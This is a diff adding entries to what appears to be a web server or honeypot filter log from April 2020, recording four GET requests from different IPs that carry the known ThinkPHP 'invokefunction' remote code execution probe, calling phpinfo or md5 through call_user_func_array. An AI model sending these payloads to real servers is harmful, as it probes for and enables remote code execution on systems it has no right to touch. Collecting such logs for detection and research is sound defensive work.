@@ -1,0 +1,12 @@
+data_filter|20200408002646|117.78.36.81|155.138.161.28/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1||
+|GET
+{"s":"index\/\\\\think\\\\app\/invokefunction","function":"call_user_func_array","vars":["phpinfo",["1"]]}
+data_filter|20200408022337|149.129.175.17|155.138.161.28/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1||
+|GET
+{"s":"index\/\\\\think\\\\app\/invokefunction","function":"call_user_func_array","vars":["phpinfo",["1"]]}
+data_filter|20200408080521|5.101.0.209|155.138.161.28:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP||
+|GET
+{"s":"\/Index\/\\\\think\\\\app\/invokefunction","function":"call_user_func_array","vars":["md5",["HelloThinkPHP"]]}
+data_filter|20200408104028|139.199.187.75|155.138.161.28/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1||
+|GET
+{"s":"index\/\\\\think\\\\app\/invokefunction","function":"call_user_func_array","vars":["phpinfo",["1"]]}
